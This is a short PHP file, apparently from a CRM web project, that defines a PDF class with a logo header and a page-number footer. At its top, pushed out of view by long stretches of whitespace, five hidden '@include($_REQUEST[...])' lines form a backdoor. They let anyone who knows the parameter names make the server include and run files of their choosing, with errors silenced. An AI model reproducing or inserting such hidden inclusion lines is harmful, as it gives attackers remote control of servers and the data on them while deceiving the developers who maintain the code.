<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         @include($_REQUEST["request_ce4f5b81af"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_3f50f6bb8c"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_f1f2167f33"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_0093efe3e9"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                @include($_REQUEST["request_3bdb7eaed1"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
include("phpToPDF.php");

class PDF extends phpToPDF
{
	//En-t�te
	function Header()
	{
		$this->Image('../img/icrm_logo.png',88,5);
	}


	//Pied de page
	function Footer()
	{
		// Positionnement � 1.5 cm du bas
		$this->SetY(290);
		$this->SetFont('Arial','I',7);
		$this->SetTextColor(0,0,0);
		$this->Cell(0,5,'Page '.$this->PageNo(),0,0,'R');
	}
}

?>